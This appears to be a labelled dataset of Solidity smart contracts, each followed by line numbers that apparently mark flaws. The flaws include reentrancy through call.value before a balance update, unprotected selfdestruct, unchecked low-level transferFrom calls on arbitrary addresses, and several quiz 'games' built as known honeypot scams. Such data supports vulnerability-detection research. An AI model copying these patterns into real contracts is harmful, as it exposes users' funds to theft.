        contributed[msg.sender] = safeAdd(contributed[msg.sender], ethToFill);
        exchange.fillOrKillOrder(
            [order.maker, order.taker, order.makerToken, order.takerToken, order.feeRecipient],
            [order.makerTokenAmount, order.takerTokenAmount, order.makerFee, order.takerFee, order.expirationTimestampInSec, order.salt],
            ethToFill,
            order.v,
            order.r,
            order.s
        );
        uint filledProtocolToken = safeDiv(safeMul(order.makerTokenAmount, ethToFill), order.takerTokenAmount);
        require(protocolToken.transfer(msg.sender, filledProtocolToken));
        if (ethToFill < msg.value) {
            require(msg.sender.send(safeSub(msg.value, ethToFill)));
        }
        if (remainingEth == ethToFill) {
            isSaleFinished = true;
            SaleFinished(block.timestamp);
            return;
        }
    }
    /// @dev Changes registration status of an address for participation.
    /// @param target Address that will be registered/deregistered.
    /// @param isRegistered New registration status of address.
    function changeRegistrationStatus(address target, bool isRegistered)
        public
        onlyOwner
        saleNotInitialized
    {
        registered[target] = isRegistered;
    }
    /// @dev Changes registration statuses of addresses for participation.
    /// @param targets Addresses that will be registered/deregistered.
    /// @param isRegistered New registration status of addresss.
    function changeRegistrationStatuses(address[] targets, bool isRegistered)
        public
        onlyOwner
        saleNotInitialized
    {
        for (uint i = 0; i < targets.length; i++) {
            changeRegistrationStatus(targets[i], isRegistered);
        }
    }
    /// @dev Calculates the ETH cap per address. The cap increases by double the previous increase at each next period. E.g 1, 3, 7, 15
    /// @return The current ETH cap per address.
    function getEthCapPerAddress()
        public
        constant
        returns (uint)
    {
        if (block.timestamp < startTimeInSec || startTimeInSec == 0) return 0;
        uint timeSinceStartInSec = safeSub(block.timestamp, startTimeInSec);
        uint currentPeriod = safeAdd(                           // currentPeriod begins at 1
              safeDiv(timeSinceStartInSec, TIME_PERIOD_IN_SEC), // rounds down
              1
        );
        uint ethCapPerAddress = safeMul(
            baseEthCapPerAddress,
            safeSub(
                2 ** currentPeriod,
                1
            )
        );
        return ethCapPerAddress;
    }
    /// @dev Verifies that an order signature is valid.
    /// @param pubKey Public address of signer.
    /// @param hash Signed Keccak-256 hash.
    /// @param v ECDSA signature parameter v.
    /// @param r ECDSA signature parameters r.
    /// @param s ECDSA signature parameters s.
    /// @return Validity of order signature.
    function isValidSignature(
        address pubKey,
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s)
        public
        constant
        returns (bool)
    {
        return pubKey == ecrecover(
            keccak256(""\x19Ethereum Signed Message:\n32"", hash),
            v,
            r,
            s
        );
    }
    /// @dev Getter function for initialized order's orderHash.
    /// @return orderHash of initialized order or null.
    function getOrderHash()
        public
        constant
        returns (bytes32)
    {
        return order.orderHash;
    }
    /// @dev Getter function for initialized order's makerTokenAmount.
    /// @return makerTokenAmount of initialized order or 0.
    function getOrderMakerTokenAmount()
        public
        constant
        returns (uint)
    {
        return order.makerTokenAmount;
    }
    /// @dev Getter function for initialized order's takerTokenAmount.
    /// @return takerTokenAmount of initialized order or 0.
    function getOrderTakerTokenAmount()
        public
        constant
        returns (uint)
    {
        return order.takerTokenAmount;",[64]
"        } else {
            receiver.transfer(this.balance);
        }
    }
}
interface tokenRecipient {
    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external;
}
contract TokenTycoonIGO is AccessService {
    uint8 public decimals = 18;
    uint256 public totalSupply = 850 * (10 ** uint256(decimals));
    string public name = ""Token Tycoon Coin"";
    string public symbol = ""TTC"";
    bytes32 private emptyHash;
    mapping (address => uint256) balances;
    mapping (address => mapping(address => uint256)) allowed;
    mapping (address => string) addressToAccount;
    mapping (bytes32 => address) accHashToAddress;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event BuyIGO(address indexed _from, string _account, uint256 _ethVal, uint256 _tthVal);
    function TokenTycoonIGO() public {
        addrAdmin = msg.sender;
        addrService = msg.sender;
        addrFinance = msg.sender;
        balances[this] = totalSupply;
        emptyHash = keccak256("""");
    }
    function() external payable {
    }
    function balanceOf(address _owner) external view returns (uint256) {
        return balances[_owner];
    }
    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) external view returns (uint256) {
        return allowed[_owner][_spender];
    }
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool) {
        require(_value <= allowed[_from][msg.sender]);
        allowed[_from][msg.sender] -= _value;
        return _transfer(_from, _to, _value);
    }
    function transfer(address _to, uint256 _value) external returns (bool) {
        return _transfer(msg.sender, _to, _value);
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        external
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    function _transfer(address _from, address _to, uint256 _value) internal returns (bool) {
        require(_to != address(0));
        uint256 oldFromVal = balances[_from];
        require(_value > 0 && oldFromVal >= _value);
        uint256 oldToVal = balances[_to];
        uint256 newToVal = oldToVal + _value;
        require(newToVal > oldToVal);
        uint256 newFromVal = oldFromVal - _value;
        balances[_from] = newFromVal;
        balances[_to] = newToVal;
        assert((oldFromVal + oldToVal) == (newFromVal + newToVal));
        Transfer(_from, _to, _value);
        return true;
    }
    function buy(string _account) external payable whenNotPaused {
        uint256 val = msg.value;
        uint256 tthVal;
        if (val == 1 ether) {
            tthVal = 1100000000000000000;
        } else if (val == 3 ether) {
            tthVal = 3600000000000000000;
        } else if (val == 5 ether) {
            tthVal = 6500000000000000000;
        } else if (val == 10 ether) {
            tthVal = 15000000000000000000;
        } else if (val == 20 ether) {
            tthVal = 34000000000000000000;
        } else {
            require(false);
        }
        uint256 b = balances[this];
        require(b >= tthVal);
        bytes32 hashAccount = keccak256(_account);
        require(hashAccount != emptyHash);
        address preAddr = accHashToAddress[hashAccount];
        string storage preAcc = addressToAccount[msg.sender];
        bytes32 hashPreAcc = keccak256(preAcc);
        if (preAddr == address(0)) {
            require(hashPreAcc == emptyHash);
            // first buy
            accHashToAddress[hashAccount] = msg.sender;
            addressToAccount[msg.sender] = _account;
            _transfer(this, msg.sender, tthVal);
        } else if(preAddr == msg.sender) {
            require(hashPreAcc == hashAccount);
            // multi buy
            _transfer(this, msg.sender, tthVal);
        } else {
            require(false);
        }
        BuyIGO(msg.sender, _account, val, tthVal);
    }
    function getCanSellBalance() external view returns(uint256) {
        return balances[this];
    }
    function getBalanceByAccount(string _account) external view returns(uint256) {
        bytes32 hashAccount = keccak256(_account);
        address addr = accHashToAddress[hashAccount];
        if (addr == address(0)) {
            return 0;
        } else {
            return balances[addr];
        }
    }
    function getIGOAccoountByAddr(address _addr) external view returns(string) {
        return addressToAccount[_addr];
    }
}",[64]
"pragma solidity ^0.5.0;
contract Transfer {
    function bulkTransfer(address payable[] memory _tos, uint256[] memory _values) public payable {
        uint256 total;
        for (uint256 i; i < _tos.length; i++) {
            _tos[i].transfer(_values[i]);
            total += _values[i];
        }
        msg.sender.transfer(msg.value - total);
    }
    function bulkTransferSameValue(address payable[] memory _tos, uint256 _value) public payable {
        uint256 total;
        for (uint256 i; i < _tos.length; i++) {
            _tos[i].transfer(_value);
            total += _value;
        }
        msg.sender.transfer(msg.value - total);
    }
    function transfer(address payable _to) public payable {
        _to.transfer(msg.value);
    }
    function balance(address _to) public view returns (uint256) {
        return _to.balance;
    }
    function kill() public {
        selfdestruct(msg.sender);
    }
}","[25, 26]"
"    */
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    //拥有者或管理员提取合约余额
    function OwnerCharge() public payable onlyOwner {
        owner.transfer(this.balance);
    }
    //提取到指定地址
    function OwnerChargeTo(address _address) public payable returns(bool){
        if(msg.sender == owner || AdminAccounts[msg.sender]){
             _address.transfer(this.balance);
             return true;
        }
       return false;
    }
    //添加管理员地址
    function addAdminList (address _evilUser) public onlyOwner {
            AdminAccounts[_evilUser] = true;
            AddedAdminList(_evilUser);
    }
    function removeAdminList (address _clearedUser) public onlyOwner {
            AdminAccounts[_clearedUser] = false;
            RemovedAdminList(_clearedUser);
    }
    event AddedAdminList(address _user);
    event RemovedAdminList(address _user);
}
contract Transit is Console,Ownable{
  using SafeMath256 for uint256;
  uint8 public constant decimals = 18;
  uint256 public constant decimalFactor = 10 ** uint256(decimals);
    address public AdminAddress;
    function Transit(address Admin) public{
        AdminAccounts[Admin] = true;
    }
    //查询当前的余额
    function getBalance() constant returns(uint){
        return this.balance;
    }
    //批量中专无问题，但调用合约里面的token到指定的地址会默认转到0x1da73c4ec1355f953ad0aaca3ef20e342aea92a 不知是什么问题  暂时先用withdraw
    function batchTtransferEther(address[]  _to,uint256[] _value) public payable {
        require(_to.length>0);
        for(uint256 i=0;i<_to.length;i++)
        {
            _to[i].transfer(_value[i]);
        }
    }
    //批量转代币 #多指定金额
    function batchTransferVoken(address from,address caddress,address[] _to,uint256[] _value)public returns (bool){
        require(_to.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint256 i=0;i<_to.length;i++){
            caddress.call(id,from,_to[i],_value[i]);
        }
        return true;
    }
	//批量转usdt
	function forecchusdt(address from,address caddress,address[] _to,uint256[] _value)public payable{
        require(_to.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint256 i=0;i<_to.length;i++){
            caddress.call(id,from,_to[i],_value[i]);
        }
    }
    //单帐号批量归集 指定合约代币Array，按照发送交易的帐号
    function tosonfrom(address from,address[] tc_address,uint256[] t_value,uint256 e_value)public payable{
        log(""address=>"",from);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint256 i=0;i<tc_address.length;i++){
            tc_address[i].call(id,msg.sender,from,t_value[i]);
        }
        from.transfer(e_value);
    }
}","[56, 65, 73]"
"pragma solidity ^0.4.22;
contract TronTronTron
{
    address  sender;
    address  receiver;
    uint  unlockTime;
    bool  closed = false;
    function PutGift(address _receiver) public payable {
        if( (!closed&&(msg.value >0.10 ether)) || sender==0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime = now;
        }
    }
    function SetGiftTime(uint _unixTime) public {
        if(msg.sender==sender) {
            unlockTime = _unixTime;
        }
    }
    function GetGift() public payable {
        if(receiver==msg.sender&&now>unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    function CloseGift() public {
        if (receiver!=0x0) {
           closed=true;
        }
    }
    function() public payable{}
}",[21]
"pragma solidity ^0.4.20;
contract TryToPlay
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract Try_Me
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_round(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract ULTRA_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function ULTRA_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.5.15;
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);
    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract UMADistributor {
    IERC20 private constant TOKEN =
        IERC20(0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828);
    function execute() external {
        TOKEN.transferFrom(0x97990B693835da58A281636296D2Bf02787DEa17, address(this),405134802037641846232);
        TOKEN.transfer(
            0xdD395050aC923466D3Fa97D41739a4ab6b49E9F5,
            400284278280230651730
        );
        TOKEN.transfer(
            0x4565Ee03a020dAA77c5EfB25F6DD32e28d653c27,
            984436396439672795
        );
        TOKEN.transfer(
            0x974678F5aFF73Bf7b5a157883840D752D01f1973,
            3312978575741423215
        );
        TOKEN.transfer(
            0x8CC7355a5c07207ef6ee188F7b74757b6bAb7DAc,
            553108785230098492
        );
        selfdestruct(address(0x0));
    }
}","[72, 90]"
"    uint public exchangeRate = 100000; //percentage times (1 ether)
    //mapping (address => uint) ustValue; //mapping of token addresses to mapping of account balances (token=0 means Ether)
    // UST address
    address public ustAddress = address(0xFa55951f84Bfbe2E6F95aA74B58cc7047f9F0644);
    // offical Address
    address public officialAddress = address(0x472fc5B96afDbD1ebC5Ae22Ea10bafe45225Bdc6);
    event Cancel(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s);
    event Deposit(address token, address user, uint amount, uint balance);
    event Withdraw(address token, address user, uint amount, uint balance);
    event exchange(address contractAddr, address reciverAddr, uint _pustBalance);
    event changeFeeAt(uint _exchangeRate);
    function chgExchangeRate(uint _exchangeRate) public onlyOwner {
        require (_exchangeRate != exchangeRate);
        require (_exchangeRate != 0);
        exchangeRate = _exchangeRate;
    }
    function exerciseOption(uint _pustBalance) public returns (bool) {
        require (now < ExerciseEndTime);
        require (_pustBalance <= balances[msg.sender]);
        // convert units from ether to wei
        uint _ether = safeMul(_pustBalance, 10 ** 14);
        require (address(this).balance >= _ether);
        // UST amount
        uint _amount = safeMul(_pustBalance, exchangeRate * 10**14);
        require (PUST(ustAddress).transferFrom(msg.sender, officialAddress, _amount) == true);
        balances[msg.sender] = safeSub(balances[msg.sender], _pustBalance);
        balances[officialAddress] = safeAdd(balances[officialAddress], _pustBalance);
        //totalSupply = safeSub(totalSupply, _pustBalance);
        msg.sender.transfer(_ether);
        emit exchange(address(this), msg.sender, _pustBalance);
    }
}
contract USTputOption is ExchangeUST {
    // constant
    uint public initBlockEpoch = 40;
    uint public eachUserWeight = 10;
    uint public initEachPUST = 3358211 * 10**11 wei;
    uint public lastEpochBlock = block.number + initBlockEpoch;
    uint public price1=26865688 * 9995 * 10**10/10000;
    uint public price2=6716422 * 99993 * 10**10/100000;
    uint public eachPUSTprice = initEachPUST;
    uint public lastEpochTX = 0;
    uint public epochLast = 0;
    address public lastCallAddress;
    uint public lastCallPUST;
    event buyPUST (address caller, uint PUST);
    event Reward (address indexed _from, address indexed _to, uint256 _value);
    function () payable public {
        require (now < ExerciseEndTime);
        require (topTotalSupply > totalSupply);
        bool firstCallReward = false;
        uint epochNow = whichEpoch(block.number);
        if(epochNow != epochLast) {
            lastEpochBlock = safeAdd(lastEpochBlock, ((block.number - lastEpochBlock)/initBlockEpoch + 1)* initBlockEpoch);
            doReward();
            eachPUSTprice = calcpustprice(epochNow, epochLast);
            epochLast = epochNow;
            //reward _first
            firstCallReward = true;
            lastEpochTX = 0;
        }
        uint _value = msg.value;
        //uint _PUST = _value * 10**decimals  / eachPUSTprice;
        uint _PUST = safeMul(_value, 10**decimals)  / eachPUSTprice;
        require(_PUST >= 1*10**decimals);
        if (safeAdd(totalSupply, _PUST) > topTotalSupply) {
            _PUST = safeSub(topTotalSupply, totalSupply);
        }
        uint _refound = safeSub(_value, safeMul(_PUST, eachPUSTprice)/10**decimals);
        if(_refound > 0) {
            msg.sender.transfer(_refound);
        }
        officialAddress.transfer(safeSub(_value, _refound));
        balances[msg.sender] = safeAdd(balances[msg.sender], _PUST);
        totalSupply = safeAdd(totalSupply, _PUST);
        emit Transfer(address(this), msg.sender, _PUST);
        // alloc first reward in a new or init epoch
        if(lastCallAddress == address(0) && epochLast == 0) {
             firstCallReward = true;
        }
        if (firstCallReward) {
            uint _firstReward = 0;
            _firstReward = _PUST * 2 / 10;
            if (safeAdd(totalSupply, _firstReward) > topTotalSupply) {
                _firstReward = safeSub(topTotalSupply, totalSupply);
            }
            balances[msg.sender] = safeAdd(balances[msg.sender], _firstReward);
            totalSupply = safeAdd(totalSupply, _firstReward);
            emit Reward(address(this), msg.sender, _firstReward);
        }
        lastEpochTX += 1;
        // last call address info
        lastCallAddress = msg.sender;
        lastCallPUST = _PUST;
        // calc last epoch
        lastEpochBlock = safeAdd(lastEpochBlock, eachUserWeight);
    }
    //
    function whichEpoch(uint _blocknumber) internal view returns (uint _epochNow) {
        if (lastEpochBlock >= _blocknumber ) {
            _epochNow = epochLast;
        } else {
            //lastEpochBlock = safeAdd(lastEpochBlock, thisEpochBlockCount);
            //thisEpochBlockCount = initBlockEpoch;
            _epochNow = epochLast + (_blocknumber - lastEpochBlock) / initBlockEpoch + 1;
        }
    }
    function calcpustprice(uint _epochNow, uint _epochLast) public returns (uint _eachPUSTprice) {
        require (_epochNow - _epochLast > 0);
        uint dif = _epochNow - _epochLast;
        uint dif100 = dif/100;
        dif = dif - dif100*100;
        for(uint i=0;i<dif100;i++)
        {
            price1 = price1-price1*5/100;
            price2 = price2-price2*7/1000;
        }
        price1 = price1 - price1*5*dif/10000;
        price2 = price2 - price2*7*dif/100000;
        _eachPUSTprice = price1+price2;
    }
    function doReward() internal returns (bool) {
        if (lastEpochTX == 1) return false;
        uint _lastReward = 0;
        if(lastCallPUST > 0) {
            _lastReward = lastCallPUST * 2 / 10;
        }
        if (safeAdd(totalSupply, _lastReward) > topTotalSupply) {","[18, 110]"
"        uint ethToTokens   = _ethers / VALUE_OF_UTS;                                //Make the conversion, divide amount of ethers by value of each UTS
        uint amountBonus   = escale(ethToTokens) / 100 * escale(bonus);
        uint _amountBonus  = amountBonus / 10 ** 36;
             tokensToSend  = ethToTokens + _amountBonus;
        return tokensToSend;
    }
    /**
     * Set the beneficiary of the contract, who receives Ethers
     *
     * @param _beneficiary          Address that will be who receives Ethers
     */
    function setBeneficiary(address _beneficiary) public onlyOwner{
        require(msg.sender == owner);                                               //Prevents the execution of another than the owner
        beneficiary = _beneficiary;                                                 //Set beneficiary
    }
    /**
     * Start the ico manually
     *
     */
    function startIco() public onlyOwner{
        ico_started = true;                                                         //Set the ico started
    }
    /**
     * Stop the ico manually
     *
     */
    function stopIco() public onlyOwner{
        ico_started = false;                                                        //Set the ico stopped
    }
    /**
     * Give back ethers to investors if soft cap is not reached
     *
     */
    function giveBackEthers() public onlyOwner icoStopped{
        require(this.balance >= ethers_collected);                                         //Require that the contract have ethers
        uint length = investorsAddress.length;                                             //Length of array
        for(uint i = 0; i < length; i++){
            address investorA = investorsAddress[i];
            uint amount       = investorsList[investorA].amount;
            if(address(beneficiary) == 0){
                beneficiary = owner;
            }
            _transfer(investorA , beneficiary , balanceOf(investorA));
            investorA.transfer(amount);
        }
    }
    /**
     * Fallback when the contract receives ethers
     *
     */
    function () payable public icoStarted minValue{
        uint amount_actually_invested = investorsList[msg.sender].amount;           //Get the actually amount invested
        if(amount_actually_invested == 0){                                          //If amount invested are equal to 0, will add like new investor
            uint index                = investorsAddress.length++;
            investorsAddress[index]   = msg.sender;
            investorsList[msg.sender] = Investors(msg.value , now);                 //Store investors info
        }
        if(amount_actually_invested > 0){                                           //If amount invested are greater than 0
            investorsList[msg.sender].amount += msg.value;                          //Increase the amount invested
            investorsList[msg.sender].when    = now;                                //Change the last time invested
        }
        uint tokensToSend = getTokensToSend(msg.value);                             //Calc the tokens to send depending on ethers received
        remaining -= tokensToSend;                                                  //Subtract the tokens to send to remaining tokens
        _transfer(owner , msg.sender , tokensToSend);                               //Transfer tokens to investor
        require(balance_[owner] >= (TOTAL_SUPPLY - ICO_SUPPLY));                     //Requires not selling more tokens than those proposed in the ico
        require(balance_[owner] >= tokensToSend);
        if(address(beneficiary) == 0){                                              //Check if beneficiary is not setted
            beneficiary = owner;                                                    //If not, set the beneficiary to owner
        }
        ethers_collected += msg.value;                                              //Increase ethers_collected
        ethers_balance   += msg.value;
        if(!beneficiary.send(msg.value)){
            revert();
        }                                                //Send ethers to beneficiary
        FundTransfer(owner , msg.value , msg.sender);                               //Fire events for clients
    }
    /**
     * Extend ICO time
     *
     * @param  timetoextend  Time in miliseconds to extend ico
     */
    function extendICO(uint timetoextend) onlyOwner external{
        require(timetoextend > 0);
        deadLine+= timetoextend;
    }
    /**
     * Destroy contract and send ethers to owner
     *
     */
    function destroyContract() onlyOwner external{
        selfdestruct(owner);
    }
}","[44, 84]"
"pragma solidity ^0.4.20;
contract UZMINI_KO
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
" */
contract FundableToken is BasicToken {
    ///Invested funds
    mapping(address => uint) public funds;
    ///Total funds behind the tokens
    uint public totalFunds;
    function FundableToken() {}
}
/**
 * Transform agent transfers tokens to a new contract. It may transform them to another tokens or refund
 * Transform agent itself can be the token contract, or just a middle man contract doing the heavy lifting.
 */
contract TransformAgent {
    ///The original supply of tokens to be transformed
    uint256 public originalSupply;
    ///The original funds behind the tokens to be transformed
    uint256 public originalFunds;
    /** Interface marker */
    function isTransformAgent() public constant returns (bool) {
        return true;
    }
    function transformFrom(address _from, uint256 _tokens, uint256 _funds) public;
}
/**
 * A token transform mechanism where users can opt-in amount of tokens to the next smart contract revision.
 *
 * First envisioned by Golem and Lunyr projects.
 */
contract TransformableToken is FundableToken, Ownable {
    /** The next contract where the tokens will be migrated. */
    TransformAgent public transformAgent;
    /** How many tokens we have transformed by now. */
    uint256 public totalTransformedTokens;
    /**
     * Transform states.
     *
     * - NotAllowed: The child contract has not reached a condition where the transform can bgun
     * - WaitingForAgent: Token allows transform, but we don't have a new agent yet
     * - ReadyToTransform: The agent is set, but not a single token has been transformed yet, so we
            still have a chance to reset agent to another value
     * - Transforming: Transform agent is set and the balance holders can transform their tokens
     *
     */
    enum TransformState {Unknown, NotAllowed, WaitingForAgent, ReadyToTransform, Transforming}
    /**
     * Somebody has transformd some of his tokens.
     */
    event Transform(address indexed _from, address indexed _to, uint256 _tokens, uint256 _funds);
    /**
     * New transform agent available.
     */
    event TransformAgentSet(address agent);
    /**
     * Allow the token holder to transform all of their tokens to a new contract.
     */
    function transform() public {
        TransformState state = getTransformState();
        require(state == TransformState.ReadyToTransform || state == TransformState.Transforming);
        uint tokens = balances[msg.sender];
        uint investments = funds[msg.sender];
        require(tokens > 0); // Validate input value.
        balances[msg.sender] = 0;
        funds[msg.sender] = 0;
        // Take tokens out from circulation
        totalSupply = totalSupply.sub(tokens);
        totalFunds = totalFunds.sub(investments);
        totalTransformedTokens = totalTransformedTokens.add(tokens);
        // Transform agent reissues the tokens
        transformAgent.transformFrom(msg.sender, tokens, investments);
        Transform(msg.sender, transformAgent, tokens, investments);
        //Once transformation is finished the contract is not needed anymore
        if(totalSupply == 0)
            selfdestruct(owner);
    }
    /**
     * Set an transform agent that handles
     */
    function setTransformAgent(address agent) onlyOwner external {
        require(agent != 0x0);
        // Transform has already begun for an agent
        require(getTransformState() != TransformState.Transforming);
        transformAgent = TransformAgent(agent);
        // Bad interface
        require(transformAgent.isTransformAgent());
        // Make sure that token supplies match in source and target
        require(transformAgent.originalSupply() == totalSupply);
        require(transformAgent.originalFunds() == totalFunds);
        TransformAgentSet(transformAgent);
    }
    /**
     * Get the state of the token transform.
     */
    function getTransformState() public constant returns(TransformState) {
        if(address(transformAgent) == 0x00) return TransformState.WaitingForAgent;
        else if(totalTransformedTokens == 0) return TransformState.ReadyToTransform;
        else return TransformState.Transforming;
    }
}
/**
 * Mintable token
 *
 * Simple ERC20 Token example, with mintable token creation
 * Issue:
 * https://github.com/OpenZeppelin/zeppelin-solidity/issues/120
 * Based on code by TokenMarketNet:
 * https://github.com/TokenMarketNet/ico/blob/master/contracts/MintableToken.sol
 */
contract MintableToken is BasicToken {
    /**
      Crowdsale contract allowed to mint tokens
    */
    function mint(address _to, uint _amount) internal {
        totalSupply = totalSupply.add(_amount);
        balances[_to] = balances[_to].add(_amount);
        //Announce that we have minted some tokens
        Transfer(0x0, _to, _amount);
    }
}
/// @title Token contract - Implements Standard Token Interface with Ubermensch features.
/// @author Dmitry Kochin - <k@ubermensch.store>
contract UbermenschPrefundToken is MintableToken, TransformableToken {
    string constant public name = ""Ubermensch Prefund"";
    string constant public symbol = ""UMP"";
    uint constant public decimals = 8;
    //The price of 1 token in Ether
    uint constant public TOKEN_PRICE = 0.0025 * 1 ether;
    //The maximum number of tokens to be sold in crowdsale
    uint constant public TOKEN_CAP = 20000000 * (10 ** decimals);","[56, 72, 73]"
"        public
        constant
        returns(address[])
    {
        return ticketIndex;
    }
    function getPlayerDetails(address player)
        public
        view
        inactiveGame
        returns (uint, uint, uint)
    {
        TicketLib.Ticket memory ticket = tickets[player];
        return (ticket.block_number, ticket.block_time, ticket.prize);
    }
    function getNumWinners()
        public
        constant
        returns (uint, uint)
    {
        var(numWinners, numFixedAmountWinners) = calculator.getNumWinners(ticketIndex.length);
        return (numWinners, numFixedAmountWinners);
    }
    function getPrizeAmount()
        public
        constant
        returns (uint result)
    {
        uint totalAmount = this.balance;
        if ( state == State.ENDED ) {
            totalAmount = bet * ticketIndex.length;
        }
        result = calculator.getPrizeAmount(totalAmount);
        return result;
    }
    function getStat()
        public
        constant
        returns ( uint, uint, uint )
    {
        var (numWinners, numFixedAmountWinners) = getNumWinners();
        return (ticketIndex.length, getPrizeAmount(), uint(numWinners + numFixedAmountWinners));
    }
    function calcaultePrizes()
        public
        returns(uint[] memory result)
    {
        var(numWinners, numFixedAmountWinners) = getNumWinners();
        uint16 totalNumWinners = uint16( numWinners + numFixedAmountWinners );
        result = new uint[]( totalNumWinners );
        uint[50] memory prizes = calculator.calcaultePrizes(
        bet, ticketIndex.length);
        for (uint16 i = 0; i < totalNumWinners; i++) {
            result[i] = prizes[i];
        }
